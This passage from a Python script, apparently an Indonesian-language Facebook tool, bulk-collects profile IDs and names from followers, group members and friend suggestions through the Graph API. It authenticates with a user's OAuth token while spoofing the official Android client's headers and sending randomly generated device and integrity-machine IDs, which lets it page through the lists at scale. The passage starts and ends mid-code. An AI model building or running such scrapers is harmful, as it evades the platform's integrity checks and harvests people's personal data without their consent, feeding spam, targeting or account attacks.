            "enable_vdmc_migrate_is_user_punchline_augment_mimicker": False,
            "vdmc_deprecate_sfvc_debug_string": False,
            "fetch_answer_agent_id": False,
            "should_fetch_prompt_name": False,
            "enable_fetching_play_count_from_sfv_context": True,
            "fetch_privacy_value_for_pending_approval_comment": False,
            "should_fetch_iab_story_post_click_data": False,
            "enable_update_cta_background_color": False,
            "enable_comment_shares": False,
            "enable_ban_author_bottomsheet_plugins": False,
            "should_defer_fetch_fdd": False,
            "include_sfd_organic_banner_overlay": True,
            "enable_takeover_for_stars_pill": False,
            "should_fetch_collaborators_from_story": False,
            "fetch_edits_app_deep_dive_pill": False,
            "enable_suggested_topic_on_feed_unit_header": False,
            "should_fetch_baked_in_text_urls": False,
            "should_include_message_styling_info": False,
            "should_fetch_inline_comments_summary": False,
            "fetch_video_title_from_media": False,
            "should_fetch_author_reacted": False,
            "should_fetch_pages_you_may_like_v_scroll": False,
            "enable_vdmc_migrate_eligible_shorts_deals_for_profile": False,
            "should_fetch_social_proof_private_share_count": False,
            "should_fetch_gen_ai_deep_dive_cta_suggestions_preview": False,
            "enable_identity_badge_v2": False,
            "include_predicted_feed_topics": False,
            "enable_reels_vdd_story_ring": False,
            "vdd_profile_picture_quality": "HIGH",
            "should_fetch_can_viewer_hide_from_fan_hub": False,
            "enable_important_reactors": True,
            "enable_quick_hide_comment": False,
            "enabled_app_rating": False,
            "should_defer_play_count_info": False,
            "should_fetch_backend_score_info": False,
            "enable_rta_in_feed_guide": False,
            "enable_reshares_from_notifs": False,
            "include_dm_ad_halo_data": True,
            "should_fetch_poke_status": False,
            "device_width_for_image": 0,
            "satp_default_image_scale": 1,
            "include_target_group_info": False,
            "enable_sponsored_label": False,
            "should_fetch_reels_share_later_info": False,
            "should_fetch_image_blurred": False,
            "should_fetch_active_exploration_assets": False,
            "enable_multi_format_chaining": False,
            "remove_dead_field": False,
            "enable_vdmc_migration_batch_5_removals": False,
            "disable_friend_deep_dive": False,
            "enable_comment_pin_v2": False,
            "enable_finds_visual_search_deep_dive_pill": False,
            "profile_entry_point": None,
            "client_product_identifier": None,
            "should_fetch_social_context_gysj": False,
            "enable_fetching_play_count_from_attachment": False,
            "include_ban_block_fields_for_pplus": False,
            "skip_story_promotions_info": False,
            "enable_comment_covers": False,
            "enable_gen_ai_deepdive_pill": False,
            "enable_composer_hint_plugins": False,
            "should_fetch_dating_assets": False,
            "enable_udd_attachment_cta_governance": False,
            "enable_fetching_auto_attribution_info_from_attachment": False,
            "should_fetch_short_list": True,
            "fetch_fbc_header": False,
            "enable_fetching_associated_dsc_deal_from_attachment": False,
            "should_fetch_messaging_ai_onboarding_flow": True,
            "enable_fetch_llm_title": False,
            "should_fetch_wem_private_sharing_params": False,
            "should_fetch_group_anonymous_post_info": True,
            "enable_vdmc_migration_batch_5_additions": False,
            "should_fetch_ugc_feedback_actions_async": False,
            "should_fetch_mib_mi2_post_embeddings": False,
            "should_fetch_ranking_time": False,
            "disable_author_with_member_profile": False,
            "should_fetch_feed_mv_friction_fragment_for_label": False,
            "enable_family_feed_attribution": False,
            "short_list_type": "MUTUAL_FOLLOWERS",
            "disable_pin_unpin": False,
            "satp_thumbnail_height": 0,
            "enable_conversation_starter": False,
            "should_fetch_ugc_suggestions": False,
            "is_comment_sharing_enabled": False,
            "fetch_messenger_contact": False,
            "should_fetch_is_eligible_for_imagine_ai": False,
            "enable_comment_private_reply": False,
            "enable_cix_screen_rollout": False,
            "fetch_facts": False,
            "enable_comment_reputation_system_comment_signals": False,
            "should_fetch_repost_info": False,
            "feedback_include_cv_related_posts_count": False,
            "enable_vdmc_migrate_is_user_music_mimicker": False,
            "should_fetch_video_delivery_response": False,
            "should_include_live_fields": False,
            "enable_organic_contextual_rerank_on_next_ad_relevance": False,
            "should_fetch_rta_feedback_post_id": False,
            "should_fetch_audience_insights_subsection": True,
            "should_fetch_story_field": False,
            "enable_text": False,
            "enable_groups_meta_ai_feedback": False,
            "enable_fetching_video_owner_from_attachment": False,
            "include_image_ranges": False,
            "disable_structured_reporting": False,
            "enable_visual_search_deep_dive_pill": False,
            "should_fetch_post_click_message": False,
            "enable_soft_removal_bottomsheet_plugins": False,
            "skip_actor_switcher_eligibility_fields": False,
            "inline_text_delight_comment_enabled": False,
            "include_ranking_signals": False,
            "include_dead_graphql_fields": True,
            "enable_add_friend_in_comments": False,
            "should_fetch_message_post_author": False,
            "should_fetch_important_reactor_profile": False,
            "enable_private_reply": True,
            "disable_commerce_profile_routing": False,
            "should_fetch_viewer_best_language_prediction_for_dubbing": False,
            "include_recommendation_ugc_description": False,
            "should_fetch_comments_downvote_fields": False,
            "profile_image_size": 120,
            "should_gen_anonymous_actor": True,
            "enable_additional_profiles_comment_composer_hint": False,
            "skip_group_interruptive_rules": False,
            "hashtag_group_id": None,
            "should_enable_chapter_feedback": False,
            "should_defer_top_level_comments": False,
            "disable_showreel_fetch": False,
            "is_from_messenger_thread": False,
            "nt_context": {
                "bloks_version": "d1583f026cccd22345fea8de656bb1d8162dabcca3249d6a0610be47545ec31a",
                "theme_params": [
                    {"design_system_name": "XMDS", "value": ["three_neutral_gray"]},
                    {"design_system_name": "FDS", "value": []}
                ],
                "is_flipper_enabled": False,
                "debug_tooling_metadata_token": None,
                "is_push_on": True,
                "pixel_ratio": 2,
                "styles_id": "6100e7e89411ccf67ace027cedecd84f",
                "using_white_navbar": True
            },
            "defer_eligible_actors_fetch": False,
            "enable_user_signals_in_comments": False,
            "should_enable_video_heatmap": False,
            "should_defer_hot_comment": False,
            "skip_negative_feedback_actions": False,
            "augment_type_name": None,
            "include_comments_api_top_level_count": False,
            "enable_stars_deepdive_pill": False,
            "should_enable_video_highlights": False,
            "should_fetch_transcript_urls": False,
            "bloks_version": None,
            "mid_card_context_input": None,
            "automatic_photo_captioning_enabled": False,
            "should_fetch_cix_fragment": False,
            "include_comment_can_viewer_report": False,
            "should_fetch_eligibility_for_x_app_follows": False,
            "short_list_limit": 6,
            "enable_fb_defer_mib_mi2_post_embeddings": False,
            "should_fetch_content_owner_reaction": False,
            "enable_ai_video_summary": False,
            "load_redundant_fields": False,
            "search_term": "",
            "enable_video_delivery_migration": False,
            "should_use_consolidated_button": True,
            "should_fetch_description_translation_availability": False,
            "enable_hd": False,
            "dont_load_templates": True,
            "enable_augment_optimization": False,
            "enabled_group_post_topic_education_onboarding": False,
            "is_work_is_sensitive_enabled": False,
            "should_fetch_is_passive_content_from_attachment": False,
            "should_fetch_cutover_info": False,
            "fetch_fields_for_entity_bundle_controls": False,
            "should_fetch_preferred_landing_surface": False,
            "dont_fetch_video_social_context": False,
            "skip_top_level_comments_total_count": False,
            "profile_list_item_edges_at_stream_use_customized_batch": False,
            "should_fetch_playable_duration": False,
            "should_fetch_birthday_avatar_nt_action": False,
            "enable_brs_vertical_decisions": False,
            "vdd_profile_picture_size": 110,
            "is_work_repost_enabled": False,
            "mib_mi2_post_embeddings_ds": None,
            "fetch_presence_eligible": False,
            "fetch_privacy_value_for_declined_comment": False,
            "should_fetch_unified_thumbnail_uris": False,
            "include_description": False,
            "should_show_presence_indicator": False,
            "should_fetch_biz_ai_agent_cta_prompts": False,
            "media_type_enum": "JPEG",
            "use_native_entrypoint_for_stars_on_reels": True,
            "should_fetch_series_fields": False,
            "enable_edit_comment_bottomsheet_plugins": False,
            "request_meetup_all_members": True,
            "should_fetch_post_sub_attachments": False,
            "should_fetch_fb_shorts_story_in_video_attachment": False,
            "include_feedback_for_reshared_post": False,
            "paginationPK": paginationPK,
            "profile_list_item_edges_after_cursor": cursor_val if cursor_val else "AQHStxRBTsBpiBzuphXrsFUA2xbXkXhCb0Ti2tlxKkw6O9kVscr4LpwdYT_VndX8bgT3MvFJprZ718fXXXq-IsH9jA",
            "include_page_has_taggable_products": False,
            "enable_comment_identity_badge": False,
            "profile_list_item_edges_first": 10
        }
        params = {
            "method": "post",
            "pretty": "false",
            "format": "json",
            "server_timestamps": "true",
            "locale": "user",
            "purpose": "fetch",
            "fb_api_req_friendly_name": "ProfileList_At_Connection_Pagination_ProfileList_profile_list_item_edges",
            "fb_api_caller_class": "AtConnection",
            "client_doc_id": "262169590518154085490045509075",
            "fb_api_client_context": {
                "client_connection_size": conn_size[0],
                "is_background": False
            },
            "variables": json.dumps(variables),
            "fb_api_analytics_tags": [
                "At_Connection",
                "pagination_framework:@connection",
                "GraphServices"
            ],
            "client_trace_id": str(uuid.uuid4())
        }
        try:
            tel = requests.post('https://graph.facebook.com/graphql', headers=headers, params=params)
            return tel.text
        except:
            return None

    cursor = None
    halaman = 0
    no_new_data_count = 0
    while True:
        halaman += 1
        resp_text = fetch_page(cursor)
        if not resp_text:
            break
        hasil_baru = _extract_id_name_from_response(resp_text)
        jumlah_sebelum = len(id)
        with id_lock:
            for entry in hasil_baru:
                if entry not in id:
                    id.append(entry)
        sys.stdout.write(f"\r{P} Berhasil Mendapatkan {H}{len(id)}{P} id{P}  ");sys.stdout.flush()
        conn_size[0] += 10

        new_cursor = None
        try:
            m = re.search(r'"profile_list_item_edges_after_cursor"\s*:\s*"([^"]+)"', resp_text)
            if m:
                new_cursor = m.group(1)
            if not new_cursor:
                m2 = re.search(r'"end_cursor"\s*:\s*"([^"]+)"', resp_text)
                if m2:
                    new_cursor = m2.group(1)
        except:
            pass

        if not new_cursor or new_cursor == cursor:
            break
        cursor = new_cursor

        if len(id) == jumlah_sebelum:
            no_new_data_count += 1
            if no_new_data_count >= 3:
                break
        else:
            no_new_data_count = 0

    print(f'\n{H}[ + ] Total Followers terkumpul: {len(id)} ID{P}')
    atur_id()


def dump_grup():
    global id
    group_id = input(f'{P}[ + ] Masukkan ID Group : ')
    print(f'\n{P}[ * ] Mulai dump group member...{P}')
    conn_size = [10]

    def fetch_page(cursor_val):
        machine_id_val = generate_machine_id()
        usdid_val = generate_usdid()
        zero_f_device_id_val = str(uuid.uuid4())
        app_scope_id_val = str(uuid.uuid4())
        trace_id = str(uuid.uuid4())
        headers = {
            'Host': 'graph.facebook.com',
            'X-Fb-Request-Analytics-Tags': '{"network_tags":{"product":"350685531728","request_category":"graphql","purpose":"fetch","retry_attempt":"0"},"application_tags":"AtConnection"}',
            'X-Fb-Product-Log': f'graphql:{trace_id}',
            'X-Fb-Rmd': 'state=URL_ELIGIBLE',
            'Priority': 'u=0',
            'User-Agent': '[FBAN/FB4A;FBAV/555.0.0.49.59;FBBV/926293029;FBDM/{density=2.0,width=900,height=1600};FBLC/en_US;FBRV/0;FBCR/PSN;FBMF/Honor;FBBD/Honor;FBPN/com.facebook.katana;FBDV/BVL-AN16;FBSV/9;FBOP/1;FBCA/x86_64:arm64-v8a;]',
            'X-Graphql-Request-Purpose': 'fetch',
            'X-Fb-Friendly-Name': 'FetchGroupMemberListRecentlyJoined_At_Connection_Pagination_Group_group_member_profiles_connection',
            'X-Zero-F-Device-Id': zero_f_device_id_val,
            'X-Zero-Eh': '2,,AWf8cHc3wiUARmzETDX6fYOnLAVMkV3mlfSPTdl2Vr-mNlkIKHbhvnxjoFp03Wzi1b0',
            'X-Fb-Integrity-Machine-Id': machine_id_val,
            'X-Fb-Device-Group': '4025',
            'X-Tigon-Is-Retry': 'False',
            'X-Graphql-Client-Library': 'graphservice',
            'X-Fb-Sim-Hni': '51000',
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-Fb-Net-Hni': '51000',
            'Content-Encoding': 'gzip',
            'Authorization': f'OAuth {accesstoken}',
            'X-Meta-Zca': 'empty_token',
            'App-Scope-Id-Header': app_scope_id_val,
            'X-Fb-Connection-Type': 'WIFI',
            'X-Meta-Usdid': usdid_val,
            'X-Fb-Http-Engine': 'Tigon/Liger',
            'X-Fb-Client-Ip': 'True',
            'X-Fb-Server-Cluster': 'True',
            'X-Fb-Conn-Uuid-Client': generate_conn_uuid(),
        }
        params = {
            "method": "post",
            "pretty": "false",
            "format": "json",
            "server_timestamps": "true",
            "locale": "user",
            "purpose": "fetch",
            "fb_api_req_friendly_name": "FetchGroupMemberListRecentlyJoined_At_Connection_Pagination_Group_group_member_profiles_connection",
            "fb_api_caller_class": "AtConnection",
            "client_doc_id": "3718233543435848979127405069",
            "fb_api_client_context": json.dumps({
                "client_connection_size": conn_size[0],
                "is_background": False
            }),
            "variables": json.dumps({
                "include_member_list_addon": True,
                "fetch_view_only_members": True,
                "group_member_profiles_connection_after_cursor": cursor_val if cursor_val else "AQHSBwj3JmyFQdN_uITifFjcSM9k5xB8tMhRNQtY3NQ_UAQZF3TQJlkuruH_lNfuHi9z8t3Pep8xoKGvTpkXL5O9qQ",
                "group_view_only_members_pagination_at_stream_initial_count": 1,
                "paginationPK": group_id,
                "group_member_profiles_connection_at_stream_use_customized_batch": False,
                "should_use_consolidated_button": True,
                "group_member_profiles_connection_first": 15,
                "profile_image_size": 128,
                "group_view_only_members_pagination_at_stream_use_customized_batch": False,
                "group_view_only_members_pagination_at_stream_enabled": False,
                "group_id": group_id
            }),
            "fb_api_analytics_tags": json.dumps([
                "At_Connection",
                "pagination_framework:@connection",
                "GraphServices"
            ]),
            "client_trace_id": str(uuid.uuid4())
        }
        try:
            tel = requests.post('https://graph.facebook.com/graphql', headers=headers, params=params)
            return tel.text
        except:
            return None

    cursor = None
    no_new_data_count = 0
    while True:
        resp_text = fetch_page(cursor)
        if not resp_text:
            break
        hasil_baru = _extract_id_name_from_response(resp_text)
        jumlah_sebelum = len(id)
        with id_lock:
            for entry in hasil_baru:
                if entry not in id:
                    id.append(entry)
        sys.stdout.write(f"\r{P} Berhasil Mendapatkan {H}{len(id)}{P} id{P}  ");sys.stdout.flush()
        conn_size[0] += 10

        new_cursor = None
        try:
            m = re.search(r'"group_member_profiles_connection_after_cursor"\s*:\s*"([^"]+)"', resp_text)
            if m:
                new_cursor = m.group(1)
            if not new_cursor:
                m2 = re.search(r'"end_cursor"\s*:\s*"([^"]+)"', resp_text)
                if m2:
                    new_cursor = m2.group(1)
        except:
            pass

        if not new_cursor or new_cursor == cursor:
            break
        cursor = new_cursor

        if len(id) == jumlah_sebelum:
            no_new_data_count += 1
            if no_new_data_count >= 3:
                break
        else:
            no_new_data_count = 0

    print(f'\n{H}[ + ] Total Group Member terkumpul: {len(id)} ID{P}')
    atur_id()


def dump_saranteman():
    global id
    print(f'\n{P}[ * ] Mulai dump saran teman...{P}')
    conn_size = [10]

    def fetch_page(cursor_val):
        machine_id_val = generate_machine_id()
        usdid_val = generate_usdid()
        zero_f_device_id_val = str(uuid.uuid4())
        app_scope_id_val = str(uuid.uuid4())
        trace_id = str(uuid.uuid4())
        headers = {
            'Host': 'graph.facebook.com',
            'X-Fb-Request-Analytics-Tags': '{"network_tags":{"product":"350685531728","request_category":"graphql","purpose":"fetch","retry_attempt":"0"},"application_tags":"AtConnection"}',
            'X-Fb-Product-Log': f'graphql:{trace_id}',
            'X-Fb-Rmd': 'state=URL_ELIGIBLE',
            'Priority': 'u=0',
            'User-Agent': '[FBAN/FB4A;FBAV/555.0.0.49.59;FBBV/926293029;FBDM/{density=2.0,width=900,height=1600};FBLC/en_US;FBRV/0;FBCR/PSN;FBMF/Honor;FBBD/Honor;FBPN/com.facebook.katana;FBDV/BVL-AN16;FBSV/9;FBOP/1;FBCA/x86_64:arm64-v8a;]',
            'X-Graphql-Request-Purpose': 'fetch',
            'X-Fb-Friendly-Name': 'FriendingJewelContentQuery_At_Connection_Pagination_Viewer_dynamic_friending_tab_paginating',
            'X-Zero-F-Device-Id': zero_f_device_id_val,
            'X-Zero-Eh': '2,,AWf8cHc3wiUARmzETDX6fYOnLAVMkV3mlfSPTdl2Vr-mNlkIKHbhvnxjoFp03Wzi1b0',
            'X-Fb-Integrity-Machine-Id': machine_id_val,
            'X-Fb-Device-Group': '4025',
            'X-Tigon-Is-Retry': 'False',
            'X-Graphql-Client-Library': 'graphservice',
            'X-Fb-Sim-Hni': '51000',
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-Fb-Net-Hni': '51000',
            'Content-Encoding': 'gzip',
            'Authorization': f'OAuth {accesstoken}',
            'X-Meta-Zca': 'empty_token',
            'App-Scope-Id-Header': app_scope_id_val,
            'X-Fb-Connection-Type': 'WIFI',
            'X-Meta-Usdid': usdid_val,
            'X-Fb-Http-Engine': 'Tigon/Liger',
            'X-Fb-Client-Ip': 'True',
            'X-Fb-Server-Cluster': 'True',
            'X-Fb-Conn-Uuid-Client': generate_conn_uuid(),
        }
        variables_saran = {
            "vdmc_deprecate_sfvc_long_press_actions": False,
            "vdmc_deprecate_sfvc_fields": False,
            "thread_fbid": None,
            "strip_notif_story": False,
            "social_bubbles_actor_filters": ["FRIENDS"],
            "skip_groups_unused_fields": False,
            "show_profiles_for_seen": False,
            "show_comment_insights_in_permalink": False,
            "should_use_consolidated_button": False,
            "should_skip_fab_convo_starters": False,
            "should_skip_custom_and_corp_labels": False,
            "should_load_video_inline_survey": False,
            "should_include_message_styling_info": False,
            "should_include_location_metadata": False,
            "should_include_friend_metadata": False,
            "should_fetch_waist_fragment_async": False,
            "vdmc_deprecate_sfvc_effects_info": False,
            "should_fetch_video_focus": False,
            "should_fetch_video_delivery_response": False,
            "should_fetch_ugc_feedback_actions_async": False,
            "should_fetch_story_view_count": False,
            "should_fetch_seen_state": False,
            "should_fetch_rta_feedback_post_id": False,
            "should_include_follow_and_subscribe_status": False,
            "should_fetch_reels_ads_caption_fragment": False,
            "should_fetch_post_sub_attachments": False,
            "should_fetch_prompt_name": False,
            "should_fetch_playable_duration": False,
            "should_fetch_new_friend_data": False,
            "session_scroll_speed": 0,
            "should_fetch_transcript_urls": False,
            "should_fetch_meta_ai_context_provider_socket": False,
            "should_fetch_m2_1_from_attachment": False,
            "ad_profile_picture_size": 110,
            "should_fetch_is_ig_xar_reels_video": False,
            "should_fetch_series_fields": False,
            "should_include_privacy_targeting": False,
            "profile_entry_point": "FRIENDS_HOME",
            "skip_reactors_on_pagination": False,
            "should_fetch_ig_backed_page": False,
            "should_fetch_gen_ai_deep_dive_cta_suggestions_previews": False,
            "should_include_friend_actions": False,
            "should_fetch_hot_comment": False,
            "use_audio_asset_id_new": False,
            "should_fetch_gen_ai_deep_dive_cta_suggestions": False,
            "vdmc_deprecate_sfvc_debug_string": False,
            "fetch_reply_approximate_position": False,
            "should_fetch_feed_share_later_info": True,
            "should_fetch_sponsored_bumpers": False,
            "should_fetch_feed_mv_friction_fragment_for_label": False,
            "should_fetch_edge_intelligence_embeddings": False,
            "should_defer_negative_feedback_actions": False,
            "should_fetch_creator_playlist_next_video": False,
            "should_fetch_augment_storefront": False,
            "fetch_video_title_from_media": False,
            "should_fetch_cta_attachments_v2": False,
            "should_include_stars_vod_ticker": False,
            "should_fetch_closed_captions": False,
            "include_image_preview_payload": False,
            "should_fetch_augment_search_prompt": False,
            "skip_group_interruptive_rules": False,
            "should_fetch_ats_nt_view": False,
            "should_fetch_anon_to_nickname_migration_bottomsheet": False,
            "social_context_count": 1,
            "should_fetch_aggregated_feedback_counts": False,
            "question_poll_count": 0,
            "should_fetch_video_focus_point": False,
            "should_fetch_community_notes_authoring_info": False,
            "should_fetch_action_chip_search_keyword": False,
            "include_restriction_notice": False,
            "include_description": False,
            "should_fetch_notif_token": False,
            "ar_effect_capabilities": [],
            "should_defer_nfa": False,
            "should_gen_anonymous_actor": True,
            "should_defer_actor_fields": False,
            "should_fetch_lfv_clip_augment": False,
            "vdd_profile_picture_size": 110,
            "satp_thumbnail_width": 0,
            "satp_thumbnail_height": 0,
            "stars_entrypoint_cta_enabled": False,
            "should_fetch_video_captions": False,
            "should_include_friend_watch_count": False,
            "satp_default_image_scale": 1,
            "max_cover_image_prefetch_count": 0,
            "remove_viewer_feedback_reaction_info_field": False,
            "should_defer_dm_params": False,
            "should_fetch_adaptive_ufi": False,
            "remove_unused_graphql_fields_group_composer_traits": False,
            "referral_source_augment_profile_id": None,
            "is_impersonator_query_enabled": False,
            "query_for_can_be_invited_by_viewer": False,
            "should_defer_hot_comment": False,
            "should_fetch_music_attribution_metadata": False,
            "should_fetch_repost_info": False,
            "should_enable_lfv_chapters": False,
            "use_separate_query_for_video_label": False,
            "enable_comment_voting": False,
            "num_friend_presence": 3,
            "non_member_group_id": "",
            "is_work_repost_enabled": False,
            "vdd_profile_picture_quality": "HIGH",
            "should_defer_post_loop_params": False,
            "ad_id": None,
            "group_id_list": [],
            "enable_sponsored_label": False,
            "should_fetch_augments_from_attachment": False,
            "is_in_ccp_aggregated_feedback_exp": False,
            "include_social_context": False,
            "should_include_future_of_feed_info": False,
            "remove_augments": False,
            "image_large_aspect_width": 0,
            "should_fetch_birthday_avatar_nt_action": False,
            "include_recommendation_ugc_description": False,
            "should_fetch_cix_fragment": False,
            "device_height_for_image": 0,
            "enable_fetching_eligible_for_comment_sheet_from_attachment": False,
            "enable_bottomsheet_plugins": False,
            "include_live_ring_fields": False,
            "include_image_ranges": False,
            "sort_order": "DEFAULT",
            "include_marketplace_ads_fields": False,
            "include_feedback_for_reshared_post": False,
            "should_fetch_biz_ai_agent_cta_prompts": False,
            "include_dead_graphql_fields": True,
            "should_fetch_should_query_search": False,
            "should_include_story_metadata": False,
            "should_fetch_unfollow_option": False,
            "should_fetch_is_ppc": False,
            "hashtag_group_id": None,
            "fetch_profile_ring_bucket_content_hash": False,
            "angora_attachment_cover_image_size": 0,
            "should_fetch_content_owner_reaction": False,
            "enable_friends_count": True,
            "dynamic_friending_tab_paginating_first": 30,
            "request_meetup_all_members": True,
            "fetch_messenger_contact": False,
            "use_default_actor": False,
            "fetch_comment_inline_survey": False,
            "social_bubbles_metadata_v2_engagement_filters": ["POSITIVE_REACTIONS"],
            "enable_fetching_play_count_from_sfv_context": True,
            "in_channel_eligibility_experiment": False,
            "fetch_privacy_value_for_pending_approval_comment": False,
            "should_include_personalized_ufi": True,
            "should_fetch_cutover_info": False,
            "feedback_reactions_floating_effect": False,
            "enable_important_reactors": True,
            "epd_feature_switches": None,
            "enable_visual_search_deep_dive_pill": False,
            "receiver_friction_enabled": True,
            "fetch_fbc_header": False,
            "enable_video_model_consolidation": False,
            "enable_vdmc_migrate_is_user_punchline_augment_mimicker": False,
            "enable_suggested_topic_on_feed_unit_header": False,
            "should_fetch_story_field": False,
            "enable_stars_deepdive_pill": False,
            "enable_composer_hint_plugins": False,
            "enable_private_reply": True,
            "enable_multi_format_chaining": False,
            "include_predicted_feed_topics": False,
            "inline_replies_count": 1,
            "enable_vdmc_migrate_is_reshare": False,
            "skip_actor_switcher_eligibility_fields": False,
            "enable_groups_meta_ai_feedback": False,
            "should_fetch_dubbed_mapping_track": False,
            "should_fetch_fb_shorts_story_in_video_attachment": False,
            "pivot_link_options": "default",
            "include_pinned_reels": False,
            "fetch_fields_for_entity_bundle_controls": False,
            "enable_soft_removal_bottomsheet_plugins": False,
            "enable_comment_reply_bottomsheet_plugins": False,
            "should_fetch_preferred_landing_surface": False,
            "enable_comment_covers": False,
            "enable_gen_ai_deepdive_pill": False,
            "should_fetch_gen_ai_deterministic_entry_point": False,
            "thumbnail_height": 0,
            "should_fetch_ranking_time": False,
            "enable_finds_visual_search_deep_dive_pill": False,
            "enable_fetching_video_owner_type_from_attachment": False,
            "should_fetch_description_translation": False,
            "include_comment_direct_parent": False,
            "should_fetch_dating_assets": False,
            "fetch_privacy_value_for_declined_comment": False,
            "enable_udd_attachment_cta_governance": False,
            "should_enable_video_heatmap": False,
            "include_dm_ad_halo_data": True,
            "enable_fetching_play_count_from_attachment": False,
            "media_type_enum": "JPEG",
            "enable_fetching_associated_dsc_deal_from_attachment": False,
            "should_fetch_1p_preferred_thumbnail": False,
            "should_fetch_messaging_ai_onboarding_flow": True,
            "enable_fetch_llm_title": False,
            "should_fetch_wem_private_sharing_params": False,
            "should_fetch_rewritten_queries": False,
            "enable_vdmc_migration_batch_5_additions": False,
            "msqrd_supported_capabilities": None,
            "feed_story_render_location": None,
            "frame_scale": 0,
            "enable_reels_vdd_story_ring": False,
            "supported_compression_types": None,
            "defer_story_attachments_subattachments": False,
            "should_defer_top_level_comments": False,
            "should_fetch_size_aware_video_delivery_fragment": False,
            "include_stars_ufi_metadata": False,
            "enable_reactions_dock_message": False,
            "enable_fetch_business_content_type": False,
            "enable_identity_badge_v2": False,
            "disable_author_with_member_profile": False,
            "enable_ban_author_bottomsheet_plugins": False,
            "enable_family_feed_attribution": False,
            "enable_additional_profiles_comment_composer_hint": False,
            "should_defer_meta_ai_context_provider_socket": False,
            "skip_actor_story_status_fields": False,
            "enable_edit_comment_with_ai_bottomsheet_plugins": False,
            "should_fetch_can_viewer_hide_from_fan_hub": False,
            "enable_quick_hide_comment": False,
            "include_feed_ad_sensitive_vertical_info": False,
            "should_fetch_important_reactor_profile": False,
            "profile_pic_media_type": None,
            "skip_attachments": False,
            "enable_reshares_from_notifs": False,
            "is_comment_sharing_enabled": False,
            "enable_edit_comment_bottomsheet_plugins": False,
            "enabled_group_post_topic_education_onboarding": False,
            "should_fetch_is_passive_content_from_attachment": False,
            "enable_comment_shares": False,
            "skip_group_composer_anon_info": False,
            "enable_download": False,
            "should_fetch_friend_request_expiration_time": False,
            "should_include_live_fields": False,
            "should_fetch_is_from_priority_ranking_funnel": False,
            "icon_scale": 1,
            "supported_features": {"client_ccu_status": "DISABLED"},
            "quality": None,
            "enable_organic_contextual_rerank_on_next_ad_relevance": False,
            "fetch_facts": False,
            "vdmc_deprecate_sfvc_sort_key": False,
            "should_fetch_multi_photo_attachment": False,
            "should_fetch_imagine_me_cta": False,
            "should_fetch_eligible_for_comment_sheet": False,
            "sticker_labels_enabled": False,
            "enable_comment_identity_badge": False,
            "should_fetch_reels_default_thumbnail": False,
            "should_fetch_byoa_fields": False,
            "enable_comment_reputation_system_comment_signals": False,
            "enable_comment_private_reply": False,
            "should_fetch_comment_share_context": False,
            "reading_attachment_profile_image_height": 0,
            "should_consolidate_button": True,
            "default_image_scale": 0,
            "max_prefetchable_video_count_in_headload": -1,
            "include_cix_screen": False,
            "enable_brs_vertical_decisions": False,
            "enable_add_friend_in_comments": False,
            "enable_story_ring": False,
            "should_fetch_message_post_author": False,
            "should_defer_play_count_info": False,
            "should_fetch_eligibility_for_x_app_follows": False,
            "angora_attachment_profile_image_size": 0,
            "should_use_poke_fields_fragment": True,
            "should_fetch_allow_freeform_prompts": False,
            "use_native_entrypoint_for_stars_on_reels": True,
            "should_fetch_social_proof_private_share_count": False,
            "enable_vdmc_migrate_eligible_shorts_deals_for_profile": False,
            "disable_inline_follow": False,
            "include_shareable_url": False,
            "should_fetch_active_exploration_assets": False,
            "is_music_comment_enabled": False,
            "should_enable_pymk_highlight": True,
            "feedback_include_cv_related_posts_count": False,
            "is_for_try_it_surface": False,
            "should_fetch_comment_ads_cta_fragment": False,
            "should_fetch_inline_comments_summary": False,
            "should_fetch_preq_signals": False,
            "enable_fetching_video_owner_from_attachment": False,
            "include_post_header_simplification": False,
            "disable_commerce_profile_routing": False,
            "disable_showreel_fetch": False,
            "include_comments_api_top_level_count": False,
            "device_width_for_image": 0,
            "include_do_wa_nux_state": True,
            "contextual_profile_context": None,
            "should_enable_video_highlights": False,
            "poll_facepile_size": 0,
            "bloks_version": None,
            "should_fetch_ugc_suggestions": False,
            "include_do_nux_state": True,
            "enable_friendship_status_on_actors": False,
            "enable_video_delivery_migration": False,
            "should_fetch_auto_dubbing_in_progress": False,
            "enable_add_icon": True,
            "include_affiliate_link_overlay": False,
            "disable_friend_deep_dive": False,
            "enable_text": False,
            "should_fetch_feed_mv_friction_fragment": False,
            "should_fetch_reels_share_later_info": False,
            "action_location": None,
            "should_fetch_video_label_from_attachment": False,
            "greeting_card_image_size_large": 0,
            "enable_pada": False,
            "should_fetch_augment_stars": False,
            "profile_picture_small_size": 120,
            "contributor_pic_height": 0,
            "include_ranking_signals": False,
            "include_target_group_info": False,
            "should_fetch_social_context_v2": False,
            "should_fetch_message_post_author_dwell": False,
            "media_type": None,
            "friend_list_render_location": "DEFAULT_LOCATION",
            "did_realtime_badge_since_cold_start": True,
            "skip_for_video_delivery_migration": False,
            "should_show_presence_indicator": False,
            "local_scroll_speed": 0,
            "cold_start_jewel_badge_count": 0,
            "should_fetch_reshare_filter_metadata": False,
            "should_fetch_prefetchable_video_metadata": False,
            "should_fetch_unified_thumbnail_uris": False,
            "should_fetch_subscribe_status_for_x_app_follows": False,
            "should_fetch_should_show_translation_label_on_original": False,
            "should_fetch_pinned_comment": False,
            "enable_hide_unhide_bottomsheet_plugins": False,
            "should_fetch_profile_navigation_info": True,
            "image_scale": 0,
            "should_fetch_ai_styles_cta": False,
            "should_fetch_description_translation_availability": False,
            "should_fetch_group_anonymous_post_info": True,
            "enable_augment_optimization": False,
            "should_fetch_interesting_top_level_comments": False,
            "greeting_card_image_size_medium": 0,
            "enable_fetch_group_reportable_type": False,
            "enable_takeover_for_stars_pill": False,
            "should_fetch_topic_pill_render_location": False,
            "should_fetch_video_type": False,
            "is_activity_status_enabled": True,
            "include_page_has_taggable_products": False,
            "skip_work_info_fields": False,
            "should_fetch_full_relevant_comments": True,
            "should_fetch_mib_mi2_post_embeddings": False,
            "is_work_build": False,
            "should_include_cix_nt_presentation": False,
            "skip_story_promotions_info": False,
            "image_high_height": 0,
            "fetch_contextual_comment_render_style": False,
            "include_video_highlights_info": False,
            "mid_card_context_input": None,
            "pivot_links_enabled": True,
            "video_delivery_caller_identifier": "VDD",
            "enable_gen_ai_content_transparency_in_comments": False,
            "thumbnail_width": 0,
            "include_sfd_organic_banner_overlay": True,
            "automatic_photo_captioning_enabled": False,
            "should_load_quick_promotion": False,
            "news_feed_only": False,
            "enable_target_media_feedback_important_reactors": False,
            "is_editing_data_enabled": False,
            "should_fetch_delegate_page_id": False,
            "augment_type_name": None,
            "place_list_max_count": 0,
